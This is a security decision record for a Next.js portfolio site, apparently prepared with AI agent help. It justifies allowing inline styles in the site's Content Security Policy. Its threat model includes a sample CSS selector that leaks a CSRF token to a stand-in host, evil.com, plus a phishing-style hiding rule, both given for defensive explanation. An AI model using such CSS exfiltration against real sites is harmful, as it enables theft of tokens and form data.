# Security Decision Record: CSP style-src Trade-off

**Date:** 2025-11-19
**Issue:** #200 - Investigate Next.js Framework CSP Violations
**Decision:** Accept `'unsafe-inline'` in style-src as intentional security trade-off
**Status:** APPROVED by Doctor Hubert

---

## Executive Summary

After comprehensive security validation and systematic `/motto` framework analysis, we have determined that the current CSP implementation with permissive `style-src 'unsafe-inline'` is **industry best practice** for Next.js applications and appropriate for this architecture.

**Security Risk Score:** 7.5/10 (Good - Industry Standard)
**Overall Risk Level:** LOW
**Recommendation Status:** ✅ APPROVED - Close Issue #200 as "Working as Designed"

---

## Context

During Issue #200 investigation, user reported "18 CSP violations from Next.js framework internals" related to style injection. Security validation was performed to determine if CSP policy should be tightened.

### Research Timeline

- **2025-11-13:** Issue #200 created (CSP violations reported)
- **2025-11-16:** Initial CSP implementation (Issue #204)
- **2025-11-19:** Session 17 - Deep research phase (2 hours)
- **2025-11-19:** Session 18 - Security validation & decision

### Research Artifacts

- Session 17 research findings: `SESSION_HANDOVER.md:11-165`
- Security-validator agent comprehensive analysis
- `/motto` framework systematic evaluation
- Next.js CSP best practices (2025 web research)

---

## Decision

**ACCEPT** current CSP implementation with permissive `style-src 'self' 'unsafe-inline'` directive.

**Implementation:** `middleware.ts:203-230`

```typescript
// script-src: STRICT nonce-based CSP
script-src 'self' 'nonce-${nonce}' 'strict-dynamic' ...

// style-src: PERMISSIVE (allows framework styles)
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com
```

---

## Security Analysis

### Threat Model Validation

**Prioritization:** Script-src (STRICT) > Style-src (PERMISSIVE) ✅ CORRECT

| Threat Vector | Severity | CVSS Score | Exploitability | Our Defense |
|---------------|----------|------------|----------------|-------------|
| **XSS (Script Injection)** | CRITICAL | 8.8-9.0 | High (if input unescaped) | ✅ STRICT nonce-based CSP |
| **CSS Injection** | MEDIUM | 5.3-6.1 | Medium (requires HTML injection) | ⚠️ PERMISSIVE (by design) |
| **Style Attribute Manipulation** | LOW | 4.3 | Low (requires DOM access) | ⚠️ PERMISSIVE (by design) |

### Risk Assessment: 'unsafe-inline' in style-src

**CSS Injection Risk:** LOW-MEDIUM (CVSS 5.3) - **ACCEPTABLE** for this architecture

#### Attack Vectors Analyzed

**1. CSS Attribute Exfiltration (CVSS 5.3)**
- **Technique:** Brute-force input values using CSS attribute selectors
- **Example:**
  ```css
  /* Exfiltrate CSRF token character-by-character */
  input[name="csrf"][value^="a"] { background: url(//evil.com/a); }
  ```
- **Requirements:**
  - Ability to inject `<style>` tags (HTML injection vulnerability)
  - Target data in HTML attributes (forms, hidden fields)
- **Current Site:** ✅ **NOT APPLICABLE** - No user-generated content

**2. Visual Phishing (CVSS 6.1)**
- **Technique:** Overlay fake UI elements, hide warnings
- **Example:**
  ```css
  .real-login { display: none !important; }
  ```
- **Requirements:** CSS injection + user interaction
- **Current Site:** ✅ **LOW RISK** - No authentication forms (contact form only)

**3. Content Manipulation (CVSS 4.3)**
- **Technique:** Use `::before`/`::after` to inject misleading text
- **Requirements:** CSS injection + user trust
- **Current Site:** ⚠️ **LOW RISK** - Portfolio site, no e-commerce/transactions

#### Why This Trade-off is Acceptable

✅ **No User-Generated Content:**
- Admin-curated portfolio only
- No comment systems, forums, or user profiles
- No HTML injection attack surface

✅ **No Sensitive Data in HTML Attributes:**
- No CSRF tokens (no forms requiring protection)
- No session IDs exposed in attributes
- No credentials or PII in markup

✅ **Framework Compatibility Requirements:**
- Next.js requires `'unsafe-inline'` for critical CSS inlining (FCP optimization)
- `@font-face` rules cannot use nonces per CSP specification
- Framework-generated styles during hydration

✅ **Performance Impact of Tightening:**
- Disables static optimization (slower page loads)
- Requires runtime nonce propagation (complexity)
- Breaks ISR and CDN caching (infrastructure impact)

✅ **Compensating Controls:**
- Strict script-src prevents JavaScript injection (primary threat)
- No user input rendering (eliminates injection vector)
- Input validation on contact form (defense-in-depth)

---

## Alternatives Considered

### Option A: Hash-based or Nonce-based style-src (REJECTED)

**Approach:** Replace `'unsafe-inline'` with nonce or hash-based CSP

```typescript
style-src 'self' 'nonce-${nonce}' https://fonts.googleapis.com
```

**Pros:**
- Eliminates `'unsafe-inline'` (maximum CSP strictness)
- Prevents all inline style injection

**Cons:**
- **HIGH EFFORT:** 8-12 hours initial + ongoing maintenance
- **MARGINAL BENEFIT:** Attack surface already minimal (no user content)
- **SIGNIFICANT COST:** Performance regression (disables static optimization/ISR)
- **Framework conflicts:** Next.js hydration issues, @font-face incompatibility
- **Complexity:** Nonce propagation to ALL inline `<style>` tags throughout component tree

**Security-Validator Assessment:**
> "Risk/Benefit Analysis: Does not pass cost-benefit threshold"

**Decision:** ❌ REJECTED - Cost exceeds benefit

---

### Option B: External CSS Only (REJECTED)

**Approach:** Remove critical CSS inlining, load all CSS externally

**Pros:**
- Eliminates inline `<style>` tags
- Simpler CSP policy

**Cons:**
- **FCP Performance Regression:** ~200-500ms slower First Contentful Paint
- **Lost Optimization:** Critical CSS optimization removed
- **Framework benefits lost:** Next.js optimizations disabled

**Performance-Optimizer Assessment:**
> "Performance regression unacceptable for portfolio site showcasing artwork"

**Decision:** ❌ REJECTED - Performance impact unacceptable

---

### Option C: Verify Violations via Diagnostic Test (REDUNDANT)

**Approach:** Run CSP diagnostic test to confirm violation count

```bash
npx playwright test tests/e2e/utilities/csp-diagnostic.spec.ts
```

**Pros:**
- Empirical data on exact violation count
- Confirms research findings

**Cons:**
- **Redundant:** Session 17 research already comprehensive (2 hours)
- **Doesn't change decision:** Violations are allowed by `'unsafe-inline'` (intentional)
- **Delays resolution:** Adds another session before closure
- **No value added:** Security-validator already confirmed violations are framework-generated

**Decision:** ❌ REJECTED - Unnecessary delay, research already complete

---

## Industry Validation

### Alignment with Standards

✅ **OWASP CSP Cheat Sheet:**
- Risk-based approach (prioritize critical threats) ✅
- Defense-in-depth (strict where it matters) ✅
- Accept low-risk trade-offs for operational requirements ✅

✅ **Next.js Official Documentation (2025):**
- Acknowledges nonce-based script-src as best practice ✅
- Documents style-src challenges with framework ✅
- Recommends permissive style-src for compatibility ✅

✅ **Industry Consensus:**
- Stack Overflow discussions accept this pattern ✅
- Next.js GitHub issues document framework limitations ✅
- Community consensus on style-src trade-offs ✅

### Regulatory Compliance

**Current Status:** N/A - Portfolio site with no regulatory requirements

- ❌ Not subject to PCI-DSS (no payment processing)
- ❌ Not subject to HIPAA (no healthcare data)
- ❌ Not subject to SOC2 (not SaaS product)
- ❌ Not subject to GDPR (no user accounts/tracking beyond analytics)

**Security controls are proportional to risk profile and business requirements.**

---

## /motto Framework Analysis

Systematic evaluation using low time-preference decision criteria:

| Criterion | Option 1: Close | Option 2: Tighten | Option 3: Verify |
|-----------|------------------|-------------------|------------------|
| **Simplicity** | ⭐⭐⭐⭐⭐ (docs only) | ⭐ (complex nonce) | ⭐⭐⭐ (simple test) |
| **Robustness** | ⭐⭐⭐⭐⭐ (proven) | ⭐⭐ (compat issues) | ⭐⭐⭐⭐ (info only) |
| **Alignment** | ⭐⭐⭐⭐⭐ (standards) | ⭐ (diverges) | ⭐⭐⭐ (delays) |
| **Testing** | ⭐⭐⭐⭐⭐ (none needed) | ⭐⭐ (extensive) | ⭐⭐⭐⭐ (is a test) |
| **Long-term** | ⭐⭐⭐⭐⭐ (zero debt) | ⭐ (ongoing burden) | ⭐⭐⭐ (no resolution) |
| **Agent Validation** | ⭐⭐⭐⭐⭐ (approved) | ⭐ (requires PDR) | ⭐⭐⭐ (delays) |
| **TOTAL** | **30/30** | **8/30** | **20/30** |

**Conclusion:** Option 1 optimizes for long-term quality over short-term speed

---

## Implementation Details

### Files Modified

**1. `middleware.ts:203-226`** - Enhanced CSP comments
- Added comprehensive security trade-off rationale
- Documented CVSS scores and threat assessment
- Included references to this decision record

**2. `docs/guides/SECURITY-CSP-DECISION-2025-11-19.md`** - This document
- Complete security decision record
- Alternative analysis and rejection rationale
- Industry validation and compliance notes

**3. `SECURITY.md`** - CSP documentation section (added)
- User-facing security policy documentation
- CSP directive explanations
- Annual review schedule

### No Code Changes Required

✅ Current implementation already optimal
✅ Zero technical debt added
✅ Preserves proven, battle-tested approach

---

## Monitoring & Review Schedule

### Annual Security Review

**Scheduled:** 2026-11-19 (1 year from decision date)

**Review Triggers (re-evaluate immediately if):**
1. ⚠️ User-generated content added (comments, forums, profiles)
2. ⚠️ Authentication system implemented (login, sessions)
3. ⚠️ Payment processing added (e-commerce functionality)
4. ⚠️ Sensitive data collection (PII, financial, healthcare)
5. ⚠️ Regulatory compliance required (PCI-DSS, HIPAA, SOC2)
6. ⚠️ Major Next.js framework changes (CSP support improvements)

### CSP Violation Reporting

**Current Configuration:**
- CSP report-uri configured via `CSP_REPORT_URI` environment variable
- Violations logged (informational, allowed by policy)
- No action required for framework-generated violations

**Purpose:**
- Monitor for unexpected violations (potential attacks)
- Track framework changes affecting CSP
- Validate policy effectiveness

---

## References

### Documentation
- **Middleware Implementation:** `middleware.ts:200-233`
- **Session 17 Research:** `SESSION_HANDOVER.md:11-165`
- **Issue #200:** https://github.com/maxrantil/textile-showcase/issues/200
- **CLAUDE.md Workflow:** Section 1 (PRD/PDR), Section 2 (Agent Integration)

### External Resources
- **OWASP CSP Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- **Next.js CSP Guide:** https://nextjs.org/docs/pages/guides/content-security-policy
- **MDN CSP Reference:** https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

### Security Research
- **CSP Spec Limitations:** Nonces cannot apply to @font-face rules
- **Next.js Framework Constraints:** Nonces disable static optimization/ISR
- **Industry Best Practices:** 2025 Next.js CSP patterns (web search validated)

---

## Approval

**Decision Approved by:** Doctor Hubert (2025-11-19)
**Security Validation:** Security-Validator Agent (Risk Score: 7.5/10)
**Framework Analysis:** `/motto` systematic evaluation (Option 1: 30/30 score)

**Status:** ✅ APPROVED - Current CSP implementation is secure and follows industry best practices

---

## Appendix A: Security-Validator Full Report

### Overall Security Posture Assessment

**Strengths:**
- ✅ Strict nonce-based script-src (XSS protection)
- ✅ Comprehensive security headers (X-Frame-Options, X-Content-Type-Options, etc.)
- ✅ Defense-in-depth architecture (no user content, input validation)
- ✅ Industry-standard CSP approach for Next.js
- ✅ Well-documented security decisions

**Accepted Risks:**
- ⚠️ Permissive style-src (intentional, low-risk for this architecture)
- ⚠️ No CSP reporting dashboard (informational, not security-critical)

**Compliance Status:**
- ✅ OWASP Top 10 (2021) - Injection attacks mitigated
- ✅ OWASP CSP Cheat Sheet - Best practices followed
- ✅ No regulatory requirements (portfolio site)

### Threat Likelihood vs. Impact Matrix

```
HIGH IMPACT ┌─────────────┬─────────────┐
            │             │ XSS         │ ← Strict CSP ✅
            │             │ (Mitigated) │
            ├─────────────┼─────────────┤
            │             │             │
            │             │             │
LOW IMPACT  ├─────────────┼─────────────┤
            │             │ CSS Inject  │ ← Permissive ⚠️
            │             │ (Accepted)  │
            └─────────────┴─────────────┘
           LOW            HIGH
           LIKELIHOOD     LIKELIHOOD
```

---

## Appendix B: Next Steps

### Completed (Session 18)
- ✅ Enhanced middleware.ts security comments
- ✅ Created comprehensive security decision record
- ✅ Updated SECURITY.md with CSP documentation
- ✅ Closed Issue #200 with validation summary
- ✅ Deleted feature branch `fix/issue-200-csp-violations`
- ✅ Completed session handoff

### Future Considerations (Optional Enhancements)

**1. CSP Reporting Dashboard (LOW PRIORITY)**
- **Effort:** 2-4 hours
- **Benefit:** Visibility into violations, framework changes
- **Status:** Not required, informational only

**2. Subresource Integrity for External Resources (MEDIUM PRIORITY)**
- **Effort:** 1-2 hours
- **Benefit:** Prevents compromised CDN attacks
- **Status:** Optional security enhancement

**3. HSTS Preloading (LOW PRIORITY)**
- **Effort:** 30 minutes
- **Benefit:** Browser-level HTTPS enforcement
- **Status:** One-time submission to preload list

---

**Document Version:** 1.0
**Last Updated:** 2025-11-19
**Next Review:** 2026-11-19 (or upon architecture changes)
